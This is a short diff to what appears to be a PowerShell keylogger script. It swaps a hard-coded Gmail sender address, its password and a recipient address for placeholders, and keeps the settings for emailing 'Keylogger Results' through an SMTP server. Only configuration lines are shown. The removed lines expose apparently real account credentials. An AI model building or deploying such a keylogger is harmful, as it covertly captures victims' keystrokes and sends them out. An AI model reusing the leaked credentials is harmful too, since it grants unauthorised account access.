@@ -1,7 +1,7 @@
 $TimeTorun = 2
-$From = "alirahmet52356@gmail.com"
-$Pass = "123456789A!"
-$To =  "hohoohh6@gmail.com"
+$From = "mail1"
+$Pass = "parola"
+$To =  "mail2"
 $Subject = "Keylogger Results"
 $body = "Keylogger Results"
 $SMTPServer = "smtp.mail.com"
